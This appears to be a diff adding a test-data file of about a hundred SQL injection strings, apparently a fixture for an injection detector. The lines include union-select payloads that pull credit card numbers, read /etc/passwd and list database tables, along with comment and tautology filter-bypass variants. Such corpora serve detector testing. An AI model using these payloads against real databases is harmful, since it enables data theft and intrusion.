@@ -1,0 +1,100 @@
+1001-\N%0aunion select 1,ccnumber,3,4 from credit_cards
+1001 sounds like '1001' union select 1,ccnumber,3,4 from credit_cards
+1001-'text' union select 1,ccnumber,3,4 from credit_cards
+1001%2b@a union select 1,load_file('/etc/passwd'),3,4 from credit_cards
+((1001)-1) union select 1,2,3,4 from credit_cards
+1001'-@a union select 1,2,3,4 from credit_cards-- -
+'1001'-@a union select 1,2,3,4 from credit_cards
+((1001)-1) union select 1,2,3,4 from credit_cards
+1001 rlike(-1)union select 1,2,3,4 from credit_cards
+## 1001 ----1 union select 1,2,3,4 from credit_cards
+1001 or 'foo' union select 1,2,3,4 from credit_cards
+1001 and @a union select 1,2,3,4 from credit_cards
+1001 like @a-1 union select 1,2,3,4 from credit_cards
+1001-\N-\N union select 1,2,3,4 from credit_cards
+(1001-\N-\N) union select 1,2,3,4 from credit_cards
+(1001-\N)-\N union select 1,2,3,4 from credit_cards
+1001-\N union select 1,2,3,4 from credit_cards
+1001-true union select 1,2,3,4 from credit_cards
+(1001-true) union select 1,2,3,4 from credit_cards
+(1001-'1') union select 1,2,3,4 from credit_cards
+(1001-@version) union select 1,2,3,4 from credit_cards
+1-(1001-true) union select 1,2,3,4 from credit_cards
+1001-false-false union select 1,2,3,4 from credit_cards
+1001-false-NULL union select 1,2,3,4 from credit_cards
+1001 rlike(1-NULL)union select 1,2,3,4 from credit_cards
+1001 rlike(1-(NULL))union select 1,2,3,4 from credit_cards
+(1)-'1' union select 1,2,3,4 from credit_cards
+(1)-@version union select 1,2,3,4 from credit_cards
+(@version)-@version union select 1,2,3,4 from credit_cards
+(@version)-1 union select 1,2,3,4 from credit_cards
+(@version)-'1' union select 1,2,3,4 from credit_cards
+@version-@version union select 1,2,3,4 from credit_cards
+@version-1 union select 1,2,3,4 from credit_cards
+@version-'1' union select 1,2,3,4 from credit_cards
+('1')-'1' union select 1,2,3,4 from credit_cards
+1001 rlike(-1-1)union select 1,2,3,4 from credit_cards
+1001 rlike(1-1)union select 1,2,3,4 from credit_cards
+1001 rlike(@version)union select 1,2,3,4 from credit_cards
+1001 rlike(@version-1)union select 1,2,3,4 from credit_cards
+1001 rlike(1-@version)union select 1,2,3,4 from credit_cards
+1001 rlike('1')union select 1,2,3,4 from credit_cards
+# vv new variations 2013-04-10 nickg vv
+1001 RLIKE ((1)) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE ((-1)) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE ((-"1")) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE (-(1)) UNION SELECT 1 FROM CREDIT_CARDS
+1001 RLIKE (-(-1)) UNION SELECT 1 FROM CREDIT_CARDS
+a%27%2B%27b
+X' != 'Y' = 0 = '1
+X' = 'X' = 0 = '1
+X' = 'X' = 'X' = 0 = '1
+X' - 'Y' - 0 = '1
+1/* /*/ */ */ or 1=1-
+1/* /* / */ */ or 1=1-
+1--
+1 --
+1  --
+1/*
+1 /*
+1  /*
+1*1--
+1 * 1--
+1 * 1 --
+1*1/*
+1 * 1/*
+1 * 1 /*
+1 * 1  /*
+@version--
+@@version--
+@version --
+@version /*
+@version/*
+(select id from users limit 1,1)
+(select id-0 from users limit 1,1)
+(select id,id,id,id from users limit 1,1)
+'1' union (select id from users limit 1,1)
+1 union (select id from users limit 1,1)
+xxx union (select id from users limit 1,1)
+@version union (select id from users limit 1,1)
+'1' union (select 1 from users limit 1,1)
+1 union (select 1 from users limit 1,1)
+xxx union (select 1 from users limit 1,1)
+@version union (select 1 from users limit 1,1)
+  '1' union (select xxx from users limit 1,1)
+1 union (select xxx from users limit 1,1)
+xxx union (select xxx from users limit 1,1)
+@version union (select xxx from users limit 1,1)
+'1' union (select 's' from users limit 1,1)
+1 union (select 's' from users limit 1,1)
+xxx union (select 's' from users limit 1,1)
+@version union (select 's' from users limit 1,1)
+-1 union(((select table_name from information_schema.tables limit 1,1)))
+'1' union(((select table_name from information_schema.tables limit 1,1)))
+@foo union(((select table_name from information_schema.tables limit 1,1)))
+id union(((select table_name from information_schema.tables limit 1,1)))
+test'-1/1/**/union(select table)
+test'-1 union(select table)
+test'-@version union (select table)
+test'-'xyz' union (select table)
+1- @version union(select table_name from information_schema.tables limit 1,1)
